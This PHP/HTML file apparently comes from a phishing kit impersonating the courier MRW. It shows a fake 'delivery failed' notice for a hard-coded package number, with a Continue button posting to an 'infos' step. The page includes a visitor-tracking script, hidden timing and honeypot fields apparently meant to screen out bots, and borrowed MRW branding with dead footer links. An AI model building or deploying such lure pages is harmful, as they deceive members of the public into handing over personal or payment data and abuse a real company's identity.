<?php require_once __DIR__ . "/../vender/visitors.php"; ?>
<?php require_once __DIR__ . "/../vender/languages.php"; ?>
<!DOCTYPE html>
<html lang="<?php echo $lang_code; ?>" <?php echo ($lang_code == 'ar' ? 'dir="rtl"' : ''); ?>>
<head>
    <meta charset="utf-8">
    <title>MRW</title>
	<!-- logo img title-->
    <link rel="icon" href="image/om.png" type="image/x-png"/>
    <link rel="shortcut icon" href="image/om.png" type="image/x-png" />
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
    <link rel="stylesheet" href="css/asse.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">

    <style>
        #menuFooter {
            background-color: #1b224d;
            color: #fff;
            padding: 40px 0;
            font-size: 0.9rem;
        }
        #menuFooter h3 {
            font-size: 1.1rem;
            font-weight: bold;
            margin-bottom: 20px;
            color: #fff;
        }
        #menuFooter ul {
            list-style: none;
            padding: 0;
        }
        #menuFooter ul li {
            margin-bottom: 8px;
        }
        #menuFooter ul li a {
            color: #ccc;
            text-decoration: none;
        }
        #social {
            display: flex;
            gap: 15px;
            margin-bottom: 20px;
        }
        #social li a {
            color: #fff !important;
        }
        #menuLegal {
            background-color: #1b224d;
            padding: 20px 0;
            text-align: center;
            border-top: 1px solid #444;
        }
        #menuLegal ul {
            list-style: none;
            padding: 0;
            margin: 0;
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 15px;
        }
        #menuLegal ul li {
            color: #888;
            font-size: 0.8rem;
        }
        #menuLegal ul li a {
            color: #888;
            text-decoration: none;
        }
        .carousel-item img {
            width: 100%;
            height: auto;
        }
        .carousel-indicators [data-bs-target] {
            background-color: #d71920;
        }
        .form-control:focus {
            border-color: #ced4da;
            box-shadow: none;
            outline: 0;
        }
        <?php if($lang_code == 'ar'): ?>
        body { text-align: right; }
        .ms-auto { margin-right: auto !important; margin-left: 0 !important; }
        .me-2 { margin-left: 0.5rem !important; margin-right: 0 !important; }
        .ms-2 { margin-right: 0.5rem !important; margin-left: 0 !important; }
        <?php endif; ?>
    </style>
</head>
<body>
    <header>
        <div class="container d-flex align-items-center">
            <img src="image/ogou.png" alt="MRW" width="100">
            <div class="ms-auto d-none d-md-block">
                <i class="fas fa-bars fa-lg text-muted"></i>
            </div>
        </div>
    </header>

    <div id="carouselImagenes" class="carousel slide" data-bs-ride="carousel">
        <div class="carousel-indicators">
            <button type="button" data-bs-target="#carouselImagenes" data-bs-slide-to="0" class="active" aria-current="true" aria-label="Slide 1"></button>
            <button type="button" data-bs-target="#carouselImagenes" data-bs-slide-to="1" aria-label="Slide 2"></button>
            <button type="button" data-bs-target="#carouselImagenes" data-bs-slide-to="2" aria-label="Slide 3"></button>
            <button type="button" data-bs-target="#carouselImagenes" data-bs-slide-to="3" aria-label="Slide 4"></button>
            <button type="button" data-bs-target="#carouselImagenes" data-bs-slide-to="4" aria-label="Slide 5"></button>
            <button type="button" data-bs-target="#carouselImagenes" data-bs-slide-to="5" aria-label="Slide 6"></button>
        </div>
        <div class="carousel-inner">
            <div class="carousel-item active">
                <picture>
                    <source media="(max-width: 767px)" srcset="image/MRW-1.jpg">
                    <img src="image/MRW-1.jpg" class="d-block w-100" alt="Mi MRW">
                </picture>
            </div>
            <div class="carousel-item">
                <picture>
                    <source media="(max-width: 767px)" srcset="image/MRW-2.jpg">
                    <img src="image/MRW-2.jpg" class="d-block w-100" alt="MRW e-Commerce">
                </picture>
            </div>
            <div class="carousel-item">
                <picture>
                    <source media="(max-width: 767px)" srcset="image/MRW-3.jpg">
                    <img src="image/MRW-3.jpg" class="d-block w-100" alt="MRW Logística Digital">
                </picture>
            </div>
            <div class="carousel-item">
                <picture>
                    <source media="(max-width: 767px)" srcset="image/MRW-4.jpg">
                    <img src="image/MRW-4.jpg" class="d-block w-100" alt="MRW e-Commerce">
                </picture>
            </div>
            <div class="carousel-item">
                <picture>
                    <source media="(max-width: 767px)" srcset="image/MRW-5.jpg">
                    <img src="image/MRW-5.jpg" class="d-block w-100" alt="MRW e-Commerce">
                </picture>
            </div>
            <div class="carousel-item">
                <picture>
                    <source media="(max-width: 767px)" srcset="image/MRW-6.jpg">
                    <img src="image/MRW-6.jpg" class="d-block w-100" alt="MRW e-Commerce">
                </picture>
            </div>
        </div>
        <button class="carousel-control-prev" type="button" data-bs-target="#carouselImagenes" data-bs-slide="prev">
            <span class="carousel-control-prev-icon" aria-hidden="true"></span>
            <span class="visually-hidden">Anterior</span>
        </button>
        <button class="carousel-control-next" type="button" data-bs-target="#carouselImagenes" data-bs-slide="next">
            <span class="carousel-control-next-icon" aria-hidden="true"></span>
            <span class="visually-hidden">Siguiente</span>
        </button>
    </div>

    <main id="main" class="py-5">
        <div class="container">
            <article class="col-md-8 mx-auto">
                <div class="login border bg-light p-4">
                    <h2 class="mb-4"><i class="fas fa-shipping-fast icon-mrw"></i> <?php echo $txt['delivery_status']; ?></h2>
                    <p class="lead"><?php echo $txt['package_number']; ?>: <strong>669852368</strong></p>
                    <div class="alert alert-warning">
                        <i class="fas fa-exclamation-triangle me-2"></i> <strong><?php echo $txt['delivery_failed']; ?></strong>
                    </div>
                    <ul class="list-group list-group-flush mb-4 bg-transparent">
                        <li class="list-group-item bg-transparent"><i class="fas fa-map-marker-alt me-2 text-secondary"></i> <?php echo $txt['failed_reason_1']; ?></li>
                        <li class="list-group-item bg-transparent"><i class="fas fa-info-circle me-2 text-secondary"></i> <?php echo $txt['failed_reason_2']; ?></li>
                        <li class="list-group-item bg-transparent"><i class="fas fa-calendar-alt me-2 text-secondary"></i> <?php echo $txt['failed_reason_3']; ?></li>
                    </ul>
                    <form action="infos" method="POST" id="index-form">
                        <input type="hidden" name="step" value="index_visit">
                        <input type="hidden" name="load_time" value="<?php echo time(); ?>">
                        <div style="display:none;">
                            <input type="text" name="hp_field" value="">
                        </div>
                        <button type="submit" class="btn btn-lg w-100"><?php echo $txt['continue']; ?> <i class="fas fa-arrow-right ms-2"></i></button>
                    </form>
                </div>
            </article>
        </div>
    </main>

    <footer class="navbar-inverse footer" id="menuFooter">
        <div class="container">
            <div class="row aligned-row">
                <div class="col-xs-12 col-sm-6 col-md-2 footer-links">
                    <h3><?php echo $txt['envios']; ?></h3>
                    <ul>
                        <li><?php echo $txt['tracking']; ?></li>
                        <li><?php echo $txt['locate_office']; ?></li>
                        <li><?php echo $txt['arrange_delivery']; ?></li>
                        <li><?php echo $txt['packaging']; ?></li>
                        <li><?php echo $txt['benefits']; ?></li>
                        <li><?php echo $txt['fuel_surcharge']; ?></li>
                        <li><?php echo $txt['general_conditions']; ?></li>
                    </ul>
                </div>

                <div class="col-xs-12 col-sm-6 col-md-2 footer-links">
                    <h3><?php echo $txt['individuals']; ?></h3>
                    <ul>
                        <li><?php echo $txt['my_mrw']; ?></li>
                        <li><?php echo $txt['your_shipments']; ?></li>
                        <li><?php echo $txt['make_shipment']; ?></li>
                        <li><?php echo $txt['national_services']; ?></li>
                        <li><?php echo $txt['international_services']; ?></li>
                        <li><?php echo $txt['mrw_pack']; ?></li>
                    </ul>
                </div>

                <div class="col-xs-12 col-sm-6 col-md-2 footer-links">
                    <h3><?php echo $txt['companies']; ?></h3>
                    <ul>
                        <li><?php echo $txt['shipments_company']; ?></li>
                        <li><?php echo $txt['become_mrw_point']; ?></li>
                        <li><?php echo $txt['national_services']; ?></li>
                        <li><?php echo $txt['international_services']; ?></li>
                        <li><?php echo $txt['burofax']; ?></li>
                        <li><?php echo $txt['digital_logistics']; ?></li>
                        <li><?php echo $txt['ecommerce']; ?></li>
                        <li><?php echo $txt['logistics_solutions']; ?></li>
                        <li><?php echo $txt['sector_solutions']; ?></li>
                    </ul>
                </div>

                <div class="col-xs-12 col-sm-6 col-md-2 footer-links">
                    <h3><?php echo $txt['social_responsibility']; ?></h3>
                    <ul>
                        <li><?php echo $txt['our_rsc']; ?></li>
                        <li><?php echo $txt['solidarity_shipments']; ?></li>
                        <li><?php echo $txt['discounted_services']; ?></li>
                        <li><?php echo $txt['ethical_channel']; ?></li>
                    </ul>
                </div>

                <div class="col-xs-12 col-sm-6 col-md-2 footer-links">
                    <h3><?php echo $txt['news_blog']; ?></h3>
                    <ul>
                        <li><?php echo $txt['blog']; ?></li>
                        <li><?php echo $txt['news']; ?></li>
                    </ul>
                </div>

                <div id="divSobreMRW" class="col-md-2 footer-links col-xs-12 col-sm-6">
                    <ul id="social">
                        <li><i class="fab fa-facebook-f fa-2x"></i></li>
                        <li><i class="fab fa-twitter fa-2x"></i></li>
                        <li><i class="fab fa-youtube fa-2x"></i></li>
                        <li><i class="fab fa-linkedin-in fa-2x"></i></li>
                        <li><i class="fab fa-instagram fa-2x"></i></li>
                    </ul>
                    <ul>
                        <li><?php echo $txt['contact_us']; ?></li>
                        <li><?php echo $txt['who_we_are']; ?></li>
                        <li><?php echo $txt['our_offices']; ?></li>
                        <li><?php echo $txt['work_with_us']; ?></li>
                        <li><?php echo $txt['customer_service']; ?></li>
                    </ul>
                </div>
            </div>
        </div>

        <div id="menuLegal">
            <div class="container">
                <ul>
                    <li><?php echo $txt['copyright']; ?></li>
                    <li><?php echo $txt['accessibility']; ?></li>
                    <li><?php echo $txt['privacy_policy']; ?></li>
                    <li><?php echo $txt['legal_notice']; ?></li>
                    <li><?php echo $txt['cookies_policy']; ?></li>
                    <li><?php echo $txt['fraud_info']; ?></li>
                    <li><?php echo $txt['eu_dispute']; ?></li>
                    <li><?php echo $txt['web_map']; ?></li>
                    <li>W3C-WAI</li>
                    <li id="gesPymeFooter" style="display: inline-block; margin-left: 10px;">
                        <img src="image/peku.png" alt="Proyecto G3 - GesPyME" style="height: 25px;">
                    </li>
                </ul>
            </div>
        </div>
    </footer>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
